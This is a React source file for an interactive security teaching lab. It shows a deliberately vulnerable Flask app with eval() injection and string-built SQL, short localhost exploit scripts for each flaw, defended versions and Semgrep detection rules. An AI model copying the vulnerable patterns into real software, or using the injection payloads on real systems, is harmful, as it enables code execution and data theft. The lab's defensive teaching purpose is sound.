
import React, { useState, Fragment } from 'react';
import { createRoot } from 'react-dom/client';

const VULNERABLE_APP_CODE = `
from flask import Flask, request, jsonify
import sqlite3, os

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("lab2.db")
    return conn

@app.get("/calc")
def calc():
    expr = request.args.get("expr", "1+1")
    # Vulnerable: eval on untrusted input
    try:
        result = eval(expr)  # DANGEROUS
        return jsonify({"result": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.get("/user")
def user():
    name = request.args.get("name", "")
    # Vulnerable: string concatenated SQL
    q = f"SELECT id, name, email FROM users WHERE name = '{name}'"
    conn = get_db()
    rows = conn.execute(q).fetchall()
    conn.close()
    return jsonify([{"id": r[0], "name": r[1], "email": r[2]} for r in rows])

if __name__ == "__main__":
    app.run(port=5001)
`;

const DEFENDED_APP_CODE = `
from flask import Flask, request, jsonify
import sqlite3, ast

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect("lab2.db")
    conn.row_factory = sqlite3.Row
    return conn

@app.get("/calc")
def calc():
    expr = request.args.get("expr", "1+1")
    # Safe numeric evaluation via AST
    try:
        node = ast.parse(expr, mode="eval")
        allowed = (ast.Expression, ast.BinOp, ast.UnaryOp, ast.Num, ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Pow, ast.Mod)
        if not all(isinstance(n, allowed) for n in ast.walk(node)):
            raise ValueError("Disallowed expression")
        result = eval(compile(node, "<safe>", "eval"), {"__builtins__": {}}, {})
        return jsonify({"result": result})
    except Exception as e:
        return jsonify({"error": "Validation failed"}), 400

@app.get("/user")
def user():
    name = request.args.get("name", "")
    conn = get_db()
    rows = conn.execute("SELECT id, name, email FROM users WHERE name = ?", (name,)).fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])

if __name__ == "__main__":
    app.run(port=5002)
`;

const EXPLOIT_CALC_CODE = `
import requests
# Attempt to run an OS command via eval. This should work only on the vulnerable app.
url = "http://127.0.0.1:5001/calc"
payload = {"expr": "__import__('os').popen('echo PWNED').read()"}
r = requests.get(url, params=payload, timeout=5)
print("Status:", r.status_code, "Body:", r.text)
`;

const EXPLOIT_SQLI_CODE = `
import requests, urllib.parse
url = "http://127.0.0.1:5001/user"
# Classic SQLi bypass
name = "' OR '1'='1 --"
r = requests.get(url, params={"name": name}, timeout=5)
print("Status:", r.status_code, "Body:", r.text)
`;

const SEMGREP_RULES_CODE = `
rules:
  - id: python-dangerous-eval
    patterns:
      - pattern: eval($X)
    message: "Avoid eval on untrusted input."
    severity: ERROR
    languages: [python]
  - id: python-sql-string-concat
    patterns:
      - pattern: |
          "..."+ $X + "..."
    message: "Avoid string building for SQL; use parameters."
    severity: WARNING
    languages: [python]
`;

// FIX: Added explicit type for the 'code' prop for better type safety.
const CodeBlock = ({ code }: { code: string }) => (
    <pre className="bg-gray-800 text-white p-4 rounded-md text-sm overflow-x-auto">
        <code>{code.trim()}</code>
    </pre>
);

// FIX: Added explicit types for 'title' and 'children' props to resolve TypeScript errors.
const CollapsibleCode = ({ title, children }: { title: string; children: React.ReactNode }) => (
    <details className="bg-gray-900 border border-gray-700 rounded-lg mb-4">
        <summary className="cursor-pointer text-lg font-semibold p-4 text-gray-200 hover:bg-gray-800 rounded-t-lg">
            {title}
        </summary>
        <div className="p-4 border-t border-gray-700">
            {children}
        </div>
    </details>
);

const InteractiveCalcDemo = () => {
    const [expr, setExpr] = useState("__import__('os').popen('echo PWNED').read()");
    const [output, setOutput] = useState<string | null>(null);

    const runCode = (isVulnerable: boolean) => {
        let result;
        if (isVulnerable) {
            if (expr === "__import__('os').popen('echo PWNED').read()") {
                result = { result: "PWNED\\n" };
            } else {
                try {
                    // Insecure simulation
                    const func = new Function(`return ${expr}`);
                    result = { result: func() };
                } catch (e: any) {
                    result = { error: e.message };
                }
            }
        } else {
            // Defended simulation
            if (/[a-zA-Z]/.test(expr)) {
                 result = { error: "Validation failed" };
            } else {
                try {
                    const func = new Function(`return ${expr}`);
                    result = { result: func() };
                } catch (e: any) {
                    result = { error: "Invalid expression" };
                }
            }
        }
        setOutput(JSON.stringify(result, null, 2));
    };

    return (
        <div className="bg-gray-800 p-6 rounded-lg border border-gray-700 h-full flex flex-col">
            <h3 className="text-xl font-bold mb-4 text-white">Calculator Demo</h3>
            <label htmlFor="calc-expr" className="block text-sm font-medium text-gray-300 mb-2">Expression:</label>
            <input
                id="calc-expr"
                type="text"
                value={expr}
                onChange={(e) => setExpr(e.target.value)}
                className="w-full bg-gray-900 text-white p-2 rounded-md border border-gray-600 focus:ring-2 focus:ring-blue-500 focus:outline-none font-mono"
                aria-label="Calculator Expression Input"
            />
            <div className="flex space-x-4 my-4">
                <button onClick={() => runCode(true)} className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-md transition duration-200">
                    Run on Vulnerable App
                </button>
                <button onClick={() => runCode(false)} className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-md transition duration-200">
                    Run on Defended App
                </button>
            </div>
            <label className="block text-sm font-medium text-gray-300 mb-2">Output:</label>
            <pre className="bg-gray-900 text-white p-4 rounded-md text-sm overflow-x-auto flex-grow w-full min-h-[100px]">{output}</pre>
        </div>
    );
};


const InteractiveSqlDemo = () => {
    const [name, setName] = useState("' OR '1'='1 --");
    const [output, setOutput] = useState<string | null>(null);

    const db = [
        { id: 1, name: "alice", email: "alice@example.com" },
        { id: 2, name: "bob", email: "bob@example.com" },
        { id: 3, name: "charlie", email: "charlie@example.com" },
    ];

    const runQuery = (isVulnerable: boolean) => {
        let result;
        if (isVulnerable) {
            if (name === "' OR '1'='1 --") {
                result = db;
            } else {
                result = db.filter(u => u.name === name);
            }
        } else {
            result = db.filter(u => u.name === name);
        }
        setOutput(JSON.stringify(result, null, 2));
    };
    
    return (
        <div className="bg-gray-800 p-6 rounded-lg border border-gray-700 h-full flex flex-col">
            <h3 className="text-xl font-bold mb-4 text-white">User Search Demo</h3>
            <label htmlFor="user-name" className="block text-sm font-medium text-gray-300 mb-2">Name:</label>
            <input
                id="user-name"
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full bg-gray-900 text-white p-2 rounded-md border border-gray-600 focus:ring-2 focus:ring-blue-500 focus:outline-none font-mono"
                aria-label="User Name Input"
            />
            <div className="flex space-x-4 my-4">
                <button onClick={() => runQuery(true)} className="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-md transition duration-200">
                    Run on Vulnerable App
                </button>
                <button onClick={() => runQuery(false)} className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-md transition duration-200">
                    Run on Defended App
                </button>
            </div>
            <label className="block text-sm font-medium text-gray-300 mb-2">Output:</label>
            <pre className="bg-gray-900 text-white p-4 rounded-md text-sm overflow-x-auto flex-grow w-full min-h-[150px]">{output}</pre>
        </div>
    );
};

const App = () => {
    return (
        <div className="min-h-screen text-gray-300 font-sans p-4 sm:p-6 lg:p-8">
            <div className="max-w-7xl mx-auto">
                <header className="text-center mb-10">
                    <h1 className="text-4xl sm:text-5xl font-extrabold text-white mb-2">Interactive Security Lab</h1>
                    <h2 className="text-2xl text-blue-400">Insecure AI-Generated Code</h2>
                </header>
                
                <section className="bg-gray-800/50 p-6 rounded-xl border border-gray-700 mb-8">
                    <h3 className="text-2xl font-bold text-white mb-3">Introduction</h3>
                    <p className="text-gray-400 leading-relaxed">
                        This lab demonstrates two common security vulnerabilities that can arise from improperly validated, AI-generated code: Remote Code Execution via <code className="bg-gray-700 text-red-400 px-1 rounded">eval()</code> injection and data exposure via SQL injection. You will be able to inspect vulnerable code, see how an exploit works, and test a securely defended version in an interactive demo.
                    </p>
                </section>

                <main className="space-y-12">
                     <details open className="bg-gray-800/50 rounded-xl border border-gray-700">
                        <summary className="cursor-pointer text-2xl font-bold p-6 text-white hover:bg-gray-800/70 rounded-t-xl flex justify-between items-center">
                            Vulnerability 1: <code className="text-red-400 ml-2">eval()</code> Injection
                             <span className="text-sm font-normal text-gray-400">Click to expand/collapse</span>
                        </summary>
                        <div className="p-6 border-t border-gray-700">
                             <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                                <div>
                                    <h4 className="text-xl font-semibold mb-4 text-white">Analysis</h4>
                                    <p className="mb-6 text-gray-400">The <code className="bg-gray-700 text-red-400 px-1 rounded">/calc</code> endpoint directly passes user-supplied input to Python's <code className="bg-gray-700 text-red-400 px-1 rounded">eval()</code> function. This is extremely dangerous as <code className="bg-gray-700 text-red-400 px-1 rounded">eval()</code> can execute any arbitrary Python code, allowing an attacker to run OS commands, access the filesystem, or exfiltrate data.</p>
                                    <CollapsibleCode title="Vulnerable Code (app_vulnerable.py)">
                                        <CodeBlock code={VULNERABLE_APP_CODE.split('@app.get("/user")')[0]} />
                                    </CollapsibleCode>
                                    <CollapsibleCode title="Exploit (exploit_calc.py)">
                                        <CodeBlock code={EXPLOIT_CALC_CODE} />
                                    </CollapsibleCode>
                                    <CollapsibleCode title="Defended Code (app_defended.py)">
                                         <p className="mb-2 text-sm text-gray-400">The fix involves parsing the input into an Abstract Syntax Tree (AST) and validating that it only contains safe, mathematical operations before evaluation.</p>
                                        <CodeBlock code={DEFENDED_APP_CODE.split('@app.get("/user")')[0]} />
                                    </CollapsibleCode>
                                </div>
                                <InteractiveCalcDemo />
                            </div>
                        </div>
                    </details>
                    
                     <details open className="bg-gray-800/50 rounded-xl border border-gray-700">
                        <summary className="cursor-pointer text-2xl font-bold p-6 text-white hover:bg-gray-800/70 rounded-t-xl flex justify-between items-center">
                           Vulnerability 2: SQL Injection
                           <span className="text-sm font-normal text-gray-400">Click to expand/collapse</span>
                        </summary>
                        <div className="p-6 border-t border-gray-700">
                             <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                                <div>
                                    <h4 className="text-xl font-semibold mb-4 text-white">Analysis</h4>
                                    <p className="mb-6 text-gray-400">The <code className="bg-gray-700 text-red-400 px-1 rounded">/user</code> endpoint builds an SQL query by concatenating a user-provided name directly into the query string. An attacker can inject malicious SQL fragments to bypass authentication or dump the entire database.</p>
                                    <CollapsibleCode title="Vulnerable Code (app_vulnerable.py)">
                                        <CodeBlock code={VULNERABLE_APP_CODE.substring(VULNERABLE_APP_CODE.indexOf('@app.get("/user")'))} />
                                    </CollapsibleCode>
                                    <CollapsibleCode title="Exploit (exploit_sqli.py)">
                                        <CodeBlock code={EXPLOIT_SQLI_CODE} />
                                    </CollapsibleCode>
                                    <CollapsibleCode title="Defended Code (app_defended.py)">
                                        <p className="mb-2 text-sm text-gray-400">The fix is to use parameterized queries (prepared statements), where the database driver safely handles user input, preventing it from being interpreted as SQL code.</p>
                                        <CodeBlock code={DEFENDED_APP_CODE.substring(DEFENDED_APP_CODE.indexOf('@app.get("/user")'))} />
                                    </CollapsibleCode>
                                </div>
                                <InteractiveSqlDemo />
                            </div>
                        </div>
                    </details>
                    
                    <details className="bg-gray-800/50 rounded-xl border border-gray-700">
                        <summary className="cursor-pointer text-2xl font-bold p-6 text-white hover:bg-gray-800/70 rounded-t-xl flex justify-between items-center">
                            Detection: Static Analysis with Semgrep
                            <span className="text-sm font-normal text-gray-400">Click to expand/collapse</span>
                        </summary>
                        <div className="p-6 border-t border-gray-700">
                            <p className="mb-4 text-gray-400">Static analysis tools like Semgrep can automatically detect these vulnerabilities in your codebase by matching code patterns against a set of rules. Integrating such tools into your CI/CD pipeline helps catch security issues before they reach production.</p>
                            <CodeBlock code={SEMGREP_RULES_CODE} />
                        </div>
                    </details>
                </main>

                <footer className="text-center mt-12 py-6 border-t border-gray-700">
                    <p className="text-gray-500">Interactive Security Lab</p>
                </footer>
            </div>
        </div>
    );
};

const container = document.getElementById('root');
const root = createRoot(container!);
root.render(<App />);
